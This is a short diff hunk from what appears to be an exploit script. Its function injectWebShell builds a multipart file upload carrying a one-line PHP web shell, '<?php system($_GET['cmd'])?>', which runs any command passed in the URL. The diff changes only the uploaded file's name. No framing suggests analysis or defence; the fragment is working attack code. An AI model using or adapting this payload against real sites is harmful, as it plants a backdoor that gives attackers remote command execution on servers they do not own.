@@ -110,7 +110,7 @@ function injectWebShell() {
     boundary += Math.floor(Math.random()*32768);
     xhr.setRequestHeader("Content-Type", 'multipart/form-data; boundary=' + boundary);
     var body = '';
-    body += '--' + boundary + '\r\n' + 'Content-Disposition: form-data; name="newAttachment"; filename="cuckedd.php"';
+    body += '--' + boundary + '\r\n' + 'Content-Disposition: form-data; name="newAttachment"; filename="cucked.php"';
     body += '\r\n\r\n';
     body += "<?php system($_GET['cmd'])?>";
     body += '\r\n'
